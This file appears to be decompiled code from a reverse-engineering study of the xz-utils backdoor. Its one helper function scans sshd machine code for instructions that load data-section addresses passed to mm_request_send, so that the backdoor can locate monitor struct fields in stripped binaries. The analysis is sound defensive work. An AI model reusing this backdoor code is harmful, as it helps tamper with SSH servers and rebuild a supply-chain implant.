// /home/kali/xzre-ghidra/xzregh/102FF0_sshd_find_monitor_field_addr_in_function.c
// Function: sshd_find_monitor_field_addr_in_function @ 0x102FF0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_monitor_field_addr_in_function(u8 * code_start, u8 * code_end, u8 * data_start, u8 * data_end, void * * monitor_field_ptr_out, global_context_t * ctx)


/*
 * AutoDoc: Sweeps a candidate sshd routine for MOV/LEA instructions that load a BSS slot into a
 * register, confirms that the pointer flows unmodified into a nearby call to `mm_request_send`,
 * and returns the underlying data-section address. The helper lets
 * `sshd_find_monitor_struct` recover individual monitor fields (send/recv fds, sshbuf pointers,
 * etc.) even when the surrounding function is stripped.
 */
#include "xzre_types.h"


BOOL sshd_find_monitor_field_addr_in_function
               (u8 *code_start,u8 *code_end,u8 *data_start,u8 *data_end,void **monitor_field_ptr_out
               ,global_context_t *ctx)

{
  byte bVar1;
  BOOL BVar2;
  u8 *puVar3;
  undefined1 uVar4;
  undefined1 uVar5;
  long lVar6;
  undefined1 uVar7;
  u8 *code_start_00;
  dasm_ctx_t *pdVar8;
  u8 *code_end_00;
  dasm_ctx_t insn_ctx;
  u8 *monitor_field_addr;
  u8 *mov_search_cursor;
  u8 *call_window_end;
  dasm_ctx_t local_80;
  
  *monitor_field_ptr_out = (void *)0x0;
  puVar3 = (u8 *)0x0;
  if (code_start < code_end) {
    pdVar8 = &local_80;
    for (lVar6 = 0x16; lVar6 != 0; lVar6 = lVar6 + -1) {
      *(undefined4 *)&pdVar8->instruction = 0;
      pdVar8 = (dasm_ctx_t *)((long)&pdVar8->instruction + 4);
    }
    while( TRUE ) {
      BVar2 = find_mov_lea_instruction(code_start,code_end,TRUE,TRUE,&local_80);
      puVar3 = (u8 *)(ulong)BVar2;
      if (BVar2 == FALSE) break;
      puVar3 = (u8 *)0x0;
      if (((local_80.prefix._0_4_ & 0x100) != 0) &&
         (puVar3 = (u8 *)local_80.mem_disp,
         ((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000)) {
        puVar3 = local_80.instruction + local_80.mem_disp + local_80.instruction_size;
      }
      uVar4 = 0;
      if ((local_80.prefix._0_4_ & 0x1040) != 0) {
        if ((local_80.prefix._0_4_ & 0x40) == 0) {
          uVar4 = local_80.prefix.decoded.flags2 & 0x10;
          if (((local_80.prefix._0_4_ & 0x1000) != 0) &&
             (uVar4 = local_80.imm64_reg, (local_80.prefix._0_4_ & 0x20) != 0)) {
            bVar1 = (char)local_80.prefix.decoded.rex << 3;
            goto LAB_001030d4;
          }
        }
        else {
          uVar4 = local_80.prefix._14_1_;
          if ((local_80.prefix._0_4_ & 0x20) != 0) {
            bVar1 = (char)local_80.prefix.decoded.rex * '\x02';
LAB_001030d4:
            uVar4 = uVar4 | bVar1 & 8;
          }
        }
      }
      code_start = local_80.instruction + local_80.instruction_size;
      if ((data_start <= puVar3) && (puVar3 < data_end)) {
        code_end_00 = code_start + 0x40;
        if (ctx->sshd_code_end < code_start + 0x40) {
          code_end_00 = (u8 *)ctx->sshd_code_end;
        }
        uVar7 = 0;
        uVar5 = 0;
        code_start_00 = code_start;
LAB_00103110:
        do {
          BVar2 = x86_dasm(&local_80,code_start_00,code_end_00);
          if (BVar2 == FALSE) {
            code_start_00 = code_start_00 + 1;
          }
          else {
            code_start_00 = local_80.instruction + local_80.instruction_size;
            if (local_80._40_4_ == 0x109) {
              bVar1 = local_80.prefix._15_1_;
              if ((local_80.prefix._0_4_ & 0x1040) == 0) {
                if ((local_80.prefix._0_4_ & 0x40) != 0) goto LAB_00103237;
              }
              else if ((local_80.prefix._0_4_ & 0x40) == 0) {
                uVar5 = local_80.prefix.decoded.flags2 & 0x10;
                if (((local_80.prefix._0_4_ & 0x1000) != 0) &&
                   (uVar5 = local_80.imm64_reg, (local_80.prefix._0_4_ & 0x20) != 0)) {
                  uVar5 = local_80.imm64_reg | ((byte)local_80.prefix.decoded.rex & 1) << 3;
                }
              }
              else {
                uVar5 = local_80.prefix._14_1_;
                if ((local_80.prefix._0_4_ & 0x20) != 0) {
                  uVar5 = local_80.prefix._14_1_ | (char)local_80.prefix.decoded.rex * '\x02' & 8U;
                }
LAB_00103237:
                uVar7 = bVar1;
                if ((local_80.prefix._0_4_ & 0x20) != 0) {
                  uVar7 = bVar1 | ((byte)local_80.prefix.decoded.rex & 1) << 3;
                }
              }
            }
            else if (local_80._40_4_ == 0x10b) {
              if ((local_80.prefix._0_4_ & 0x40) == 0) {
                if ((local_80.prefix._0_4_ & 0x1040) != 0) {
                  bVar1 = local_80.imm64_reg;
                  if ((local_80.prefix._0_4_ & 0x1000) != 0) goto LAB_00103237;
                  uVar7 = local_80.prefix.decoded.flags2 & 0x10;
                  if (uVar4 != uVar5) goto LAB_0010325f;
                  uVar7 = 0;
                  uVar4 = local_80.prefix.decoded.flags2 & 0x10;
                  goto LAB_00103110;
                }
              }
              else if ((local_80.prefix._0_4_ & 0x20) == 0) {
                uVar5 = local_80.prefix._15_1_;
                if ((local_80.prefix._0_4_ & 0x1040) != 0) {
                  uVar7 = local_80.prefix._14_1_;
                }
              }
              else {
                uVar5 = local_80.prefix._15_1_ | (char)local_80.prefix.decoded.rex * '\b' & 8U;
                if ((local_80.prefix._0_4_ & 0x1040) != 0) {
                  uVar7 = (char)local_80.prefix.decoded.rex * '\x02' & 8U | local_80.prefix._14_1_;
                }
              }
            }
            if (uVar4 == uVar5) {
              uVar4 = uVar7;
              if (uVar7 == 7) {
                BVar2 = find_call_instruction
                                  (local_80.instruction + local_80.instruction_size,code_end_00,
                                   (u8 *)ctx->sshd_ctx->mm_request_send_start,&local_80);
                if (BVar2 != FALSE) {
                  *monitor_field_ptr_out = puVar3;
                  puVar3 = (u8 *)(ulong)BVar2;
                  goto LAB_001032a5;
                }
                break;
              }
              goto LAB_00103110;
            }
          }
LAB_0010325f:
        } while (code_start_00 < code_end_00);
      }
      puVar3 = code_end;
      if (code_end <= code_start) break;
    }
  }
LAB_001032a5:
  return (BOOL)puVar3;
}

